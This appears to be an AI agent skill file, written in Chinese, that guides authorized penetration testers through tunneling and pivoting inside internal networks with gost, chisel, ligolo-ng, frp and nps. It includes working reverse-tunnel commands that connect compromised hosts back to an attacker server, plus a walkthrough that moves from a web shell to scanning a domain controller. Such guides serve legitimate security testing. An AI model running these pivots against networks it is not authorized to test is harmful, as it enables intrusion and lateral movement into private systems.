---
name: tunnel-pivot
description: 内网穿透与隧道搭建。需要把外部流量导进内网、把内网服务暴露出来、建立 SOCKS 代理、做多层 pivot 时使用。覆盖 chisel/gost/ligolo-ng/frp/nps 五种方案的选择与配置。
---

# 隧道与内网穿透

在**已授权**的内网测试中，如何在受限网络里建立稳定通道。

---

## 先判断：你需要哪种隧道

```
你要做什么？
│
├─ 让本机工具能访问内网  ────────────→ SOCKS 代理
│   curl/ffuf/nmap 走内网                gost / chisel
│
├─ 把内网服务暴露到公网  ────────────→ 反向隧道
│   内网 Web 让外部访问                  frp / nps
│
├─ 目标只能出网、不能入网  ──────────→ 反向连接
│   拿 shell 但连不进去                  chisel R: / ligolo
│
└─ 需要整段路由可达  ────────────────→ TUN 隧道
    访问内网所有 IP                       ligolo-ng
```

---

## 方案一：gost（最简 SOCKS）

**适用**：只需一个 SOCKS5 出口，目标机器上能跑命令。

```bash
# 在被控机器起 SOCKS5（监听本机 1080）
gost -L socks5://127.0.0.1:1080

# 或带认证
gost -L socks5://user:pass@127.0.0.1:1080

# 或监听所有网卡（谨慎，等于开了个开放代理）
gost -L socks5://:1080
```

**本机使用**：

```bash
curl --socks5-hostname 127.0.0.1:1080 http://internal.corp/
ffuf -u http://internal/FUZZ -w list.txt -x socks5://127.0.0.1:1080
proxychains4 nmap -sT -Pn internal.corp   # 需配 /etc/proxychains.conf
```

**优点**：单文件、零配置、启动即用
**缺点**：只能正向用；如果目标在你连不到的网络里，用不了

---

## 方案二：chisel（HTTP 隧道，穿透强）

**适用**：目标只能出 HTTP，或需要反向端口转发。

### 正向：本机连服务端

```bash
# 服务端（你控制的公网机器）
chisel server -p 8080 --reverse

# 客户端（目标机器）—— 把目标内网导到你这边
chisel client <你的IP>:8080 R:socks
# 之后本机 1080 就是目标的 SOCKS5
```

### 反向：暴露目标端口

```bash
# 服务端
chisel server -p 8080 --reverse

# 客户端 —— 把目标的 3306 映射到你本机 33060
chisel client <你的IP>:8080 R:33060:127.0.0.1:3306
```

### 多点转发

```bash
# 一组端口一起映射
chisel client <IP>:8080 R:8080:127.0.0.1:80 R:2222:127.0.0.1:22 R:socks
```

**优点**：走 HTTP/WebSocket，防火墙友好；单二进制
**缺点**：需要你先有一个可达的服务端

---

## 方案三：ligolo-ng（TUN，整段可达）

**适用**：需要访问内网**一整段 IP**，而不只是单个端口。

```bash
# 攻击侧（PC 上，需要 root 建 TUN）
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 内网侧（上传到目标）
./ligolo-agent -connect <攻击IP>:11601 -ignore-cert
```

**回到 proxy 控制台**：

```
ligolo-ng » session           # 列出会话
[Agent : user@host] » 1       # 进入会话 1
[Agent : user@host] » ifconfig
  eth0: 10.10.10.5/24
[Agent : user@host] » start   # 建 TUN 隧道
```

**之后加路由**：

```bash
ip route add 10.10.10.0/24 dev ligolo
ip route add 172.16.0.0/16 dev ligolo
```

现在可以直接 `nmap 10.10.10.6`，就像同一网段。

**优点**：整段可达，不需要 proxychains
**缺点**：proxy 侧需要 root 建 TUN；Android 上只能跑 agent

### 多层 pivot

```
攻击机 ──ligolo-proxy──→ 跳板A ──ligolo-agent──→ 内网1
                          │
                          └── 在跳板A 再起 agent ──→ 内网2
```

---

## 方案四：frp（成熟，多协议）

**适用**：长期稳定的穿透，需要 TCP/UDP/HTTP 多协议。

### 服务端 frps.toml

```toml
bindPort = 7000
auth.token = "your-token"

vhostHTTPPort = 80
vhostHTTPSPort = 443
```

```bash
frps -c frps.toml
```

### 客户端 frpc.toml

```toml
serverAddr = "your-server-ip"
serverPort = 7000
auth.token = "your-token"

[[proxies]]
name = "ssh"
type = "tcp"
localIP = "127.0.0.1"
localPort = 22
remotePort = 6000

[[proxies]]
name = "web"
type = "tcp"
localIP = "127.0.0.1"
localPort = 8080
remotePort = 8080
```

```bash
frpc -c frpc.toml
```

**优点**：功能全、文档多、稳定
**缺点**：配置文件稍复杂，需要服务端

---

## 方案五：nps/npc（带 Web 面板）

**适用**：需要图形化管理多个客户端。

```bash
# 服务端（首次启动会生成 Web 面板）
nps  # 默认 8080 端口

# 客户端（vkey 在 Web 面板里创建）
npc -server=<IP>:8024 -vkey=<vkey>
```

**优点**：Web 管理、多客户端
**缺点**：组件较重；npc 版本较老（2021）

---

## 选型对照表

| 场景 | 首选 | 备选 |
|---|---|---|
| 只要 SOCKS | **gost** | chisel |
| 目标只能出 HTTP | **chisel** | — |
| 要访问整段内网 | **ligolo-ng** | chisel + SOCKS |
| 长期稳定穿透 | **frp** | nps |
| 多客户端管理 | **nps** | frp |
| Android 当跳板 | gost / chisel / npc | ligolo agent |

---

## 实战：三层内网

```
攻击机(公网) ──→ 边界Web(10.0.0.5) ──→ 内网DB(192.168.10.20)
                        │
                        └──→ 域控(192.168.10.1)
```

### 步骤 1：在边界 Web 上拿 shell

```bash
# 上传 gost / chisel 到 Web 服务器
# 起 SOCKS，把 10.0.0.0/24 导出来
./gost -L socks5://0.0.0.0:1080
```

### 步骤 2：本机通过 SOCKS 访问 10.0.0.0/24

```bash
proxychains4 -q nmap -sT -Pn 10.0.0.0/24 -p 22,80,443,3389
```

### 步骤 3：找到 192.168.10.0/24 的入口

```bash
# 在 10.0.0.5 上起 ligolo agent，把 192.168.10.0/24 暴露出来
./ligolo-agent -connect <攻击机>:11601 -ignore-cert

# 攻击机 ligolo-proxy 里 start + 加路由
ip route add 192.168.10.0/24 dev ligolo
```

### 步骤 4：直达域控

```bash
nmap -sT -Pn 192.168.10.1 -p 88,389,445,3389
```

---

## 常见坑

| 现象 | 原因 | 解决 |
|---|---|---|
| chisel 连不上 | 服务端未加 `--reverse` | 反向映射必须加 |
| ligolo start 失败 | 无 root / 无 TUN | 需要 root；Android 受限 |
| gost 起不来 | 端口被占 | 换端口或用 `:0` 随机 |
| frp 连上但访问不到 | 服务端防火墙 | 开 remotePort |
| SOCKS 能连但 DNS 失败 | 用了 `socks5://` 而非 `socks5h://` | curl 要用 `socks5h` 让代理解析 |
| proxychains 不生效 | 配置文件路径错 | 默认 `/etc/proxychains.conf`，Android 用 `proxychains4 -f` 指定 |

---

## 安全提醒

**1. 不要在目标机器上留持久化**——测试结束清理所有上传的二进制。

**2. 隧道会记录流量**——如果目标有 EDR，长时间连接容易被发现。用完即关。

**3. 不要开 `0.0.0.0` 的开放代理**——等于把内网暴露给整个互联网。始终用 `127.0.0.1` 或加认证。

**4. frp/nps 的 token 别用默认值**——默认 token 是公开的，任何人都能连你的服务端。
